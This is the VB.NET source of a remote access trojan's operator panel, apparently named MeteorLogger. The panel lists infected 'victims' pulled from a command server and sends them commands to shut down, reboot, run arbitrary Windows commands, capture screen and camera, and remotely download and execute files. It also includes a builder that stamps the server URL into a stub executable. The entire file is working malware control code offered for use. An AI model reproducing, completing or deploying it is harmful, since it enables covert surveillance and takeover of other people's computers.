Imports System.Net
Imports System.Text
Imports System.IO
Imports Newtonsoft.Json
Imports System.ComponentModel

Public Class RatPanel
    Private mainWebClient As New WebClient()
    Private demandsClosing As Boolean = False
    Private Sub RatPanel_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        CheckForIllegalCrossThreadCalls = False
        ClientListManager.RunWorkerAsync()
    End Sub
    Private Sub AddLogMessage(message As String)
        Log.Items.Add(message)
    End Sub

    Private Sub ClientListManager_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles ClientListManager.DoWork
        While Not demandsClosing
            Dim clientInfoList As String()

            Try
                clientInfoList = Split(New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=cleanit"), "[;;]")
            Catch ex As WebException
                MsgBox("Unable to connect to the FTP server." & ControlChars.Lf & "FTP: " & My.Settings.vpsurl, MsgBoxStyle.Exclamation)
                End
            End Try

            Invoke(Sub() connectedClientsView.Rows.Clear())
            Invoke(Sub() connectedClientsView.Refresh())

            If clientInfoList.Count > 0 OrElse clientInfoList(0).Trim.Length > 0 Then
                Dim clientsCount As Integer = 0

                For Each currentClientData As String In clientInfoList
                    If currentClientData.Trim.Length = 0 Then Continue For

                    Try
                        Dim jsonParse = Linq.JObject.Parse(currentClientData)

                        Dim ip = jsonParse.Item("ip").ToString()
                        Dim ping = jsonParse.Item("ping").ToString()
                        Dim cpu = jsonParse.Item("cpu").ToString()
                        Dim ram = jsonParse.Item("ram").ToString()
                        Dim softwareName = jsonParse.Item("softwarename").ToString()
                        Dim upTime = jsonParse.Item("uptime").ToString()

                        Dim upTimeFormatted As String = ""

                        If upTime.Trim <> "" Then
                            Dim iSpan As TimeSpan = TimeSpan.FromSeconds(upTime)
                            upTimeFormatted = iSpan.Hours.ToString.PadLeft(2, "0"c) + ":" +
                                iSpan.Minutes.ToString.PadLeft(2, "0"c) & ":" +
                                iSpan.Seconds.ToString.PadLeft(2, "0"c)
                        End If

                        Dim currentWindow =
                            Encoding.UTF8.GetString(Convert.FromBase64String(jsonParse.Item("currentwindow").ToString()))

                        If ip.Trim.Length > 0 Then
                            Invoke(Sub() connectedClientsView.Rows.Add(ip, cpu & "%", ram, ping & "ms", currentWindow, upTimeFormatted, softwareName))
                        End If
                    Catch ex As JsonReaderException
                        MsgBox("Unable to serialize victims data from API" & ControlChars.Lf & "FTP: " & My.Settings.vpsurl, MsgBoxStyle.Exclamation)
                        End
                    End Try

                    clientsCount += 1
                Next

                clientListLBL.Text = "Clients : " & clientsCount
            End If

            Threading.Thread.Sleep(4500)
        End While
    End Sub

#Region "PanelEventsManagement"
    Private Sub connectedClientsView_CellMouseDown(sender As Object, e As System.Windows.Forms.DataGridViewCellMouseEventArgs) Handles connectedClientsView.CellMouseDown
        If e.Button = MouseButtons.Right Then
            optionsCMS.Show(Cursor.Position)
        End If
    End Sub

    ''' <summary>
    ''' This function automatically grabs the target IP,
    ''' then asks for safety and finally proceed to a direct command query on the HTTP server
    ''' </summary>
    Private Sub runDirectPanelCommand(message As String,
                                      actionType As String,
                                      actionContent As String())

        Dim targetIp As String = connectedClientsView.CurrentCell.Value.ToString
        Dim actionContentParsed As String = ""
        Dim contentNum As Integer = 1

        For Each _data In actionContent
            If _data.Contains(" ") Then _data = """" & _data & """"

            If contentNum = 1 Then
                actionContentParsed &= "&actioncontent=" & _data
            Else
                actionContentParsed &= "&actioncontent" & contentNum & "=" & _data
            End If

            contentNum += 1
        Next

        If MsgBox(message, MsgBoxStyle.YesNo) = MsgBoxResult.Yes Then
            For i = 0 To 5
                mainWebClient.DownloadString(
                    My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=" & actionType & actionContentParsed
                )

            Next
        End If
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShutdownToolStripMenuItem.Click
        runDirectPanelCommand("Are you sure you want to shutdown this victim's computer ?", "runwincmd",
                              {"shutdown /s /f /t 0"})
    End Sub

    Private Sub RebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RebootToolStripMenuItem.Click
        runDirectPanelCommand("Are you sure you want to reboot this victim's computer ?", "runwincmd",
                              {"shutdown /r /f /t 0"})
    End Sub

    Private Sub RATShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATShutdownToolStripMenuItem.Click
        runDirectPanelCommand("Are you sure you want to shutdown the RAT on this victim's computer ?", "shutdownrat", {})
    End Sub

    Private Sub ScreenMonitorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScreenMonitorToolStripMenuItem.Click
        Dim form As New ScreenMonitor()
        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
        form.Show()
    End Sub

    Private Sub RemoteFileExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteFileExecuteToolStripMenuItem.Click
        Dim form As New RemoteDownload()
        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
        form.Show()
    End Sub

    Private Sub LaunchChatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LaunchChatToolStripMenuItem.Click
        Dim form As New RemoteChat()
        form.targetIp = connectedClientsView.CurrentCell.Value.ToString
        form.Show()

        mainWebClient.DownloadString(
                My.Settings.vpsurl & "clients.php?action=senddata&target=" & form.targetIp & "&actiontype=openremotechat")
    End Sub
    Private Sub CameraMonitorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CameraMonitorToolStripMenuItem.Click
        ' TODO : add multiple window support

        Dim targetIp As String = connectedClientsView.CurrentCell.Value.ToString
        MsgBox("Sending screenshot request To :     " & targetIp)
        MsgBox(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=camerashot")
        mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=camerashot")
    End Sub

    Private Sub RATRebootToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATRebootToolStripMenuItem.Click
        runDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "rebootrat", {})
    End Sub
#End Region
    Private Sub RATUninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATUninstallToolStripMenuItem.Click
        runDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "uninstallrat", {})

    End Sub

    Private Sub RatPanel_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        demandsClosing = True
        ClientListManager.CancelAsync()
    End Sub

#Region "UnspecificEvents"
    Private Sub BuildButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BuildButton.Click
        Dim saveFile As New SaveFileDialog
        saveFile.Filter = "Executable | *.exe"
        saveFile.Title = "Where do you want to save your executable ?"

        If saveFile.ShowDialog = DialogResult.OK Then
            AddLogMessage("Writing stub bytes...")
            Dim stubBytes As Byte() = My.Resources.stub
            File.WriteAllBytes(saveFile.FileName, stubBytes)

#Region "WriteEOF"
            AddLogMessage("Writing EOF info...")

            FileOpen(1, saveFile.FileName, OpenMode.Binary, OpenAccess.Read)
            Dim Data As String = Space(LOF(1))
            FileGet(1, Data)
            FileClose(1)

            FileOpen(2, saveFile.FileName, OpenMode.Binary, OpenAccess.Default)
            FilePut(2, Data & "[;;]" & My.Settings.vpsurl)
            FileClose(2)
#End Region

            AddLogMessage("Built !")
            'MsgBox("Your RAT was saved successfully !", MsgBoxStyle.Information, "Success - MeteorLogger")
        End If
    End Sub

    Private Sub PingButton_Click(sender As Object, e As EventArgs) Handles PingButton.Click
        Dim pingThread As New Threading.Thread(Sub() Shell("cmd.exe /c ping " & My.Settings.vpsurl.Split("/")(2) & " -t",
                AppWinStyle.NormalFocus, True))
        pingThread.Start()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs)
        If Button1.Text = "EDIT" Then Button1.Text = "SAVE" : TextBox1.Enabled = True Else Button1.Text = "EDIT" : TextBox1.Enabled = False
    End Sub



#End Region

End Class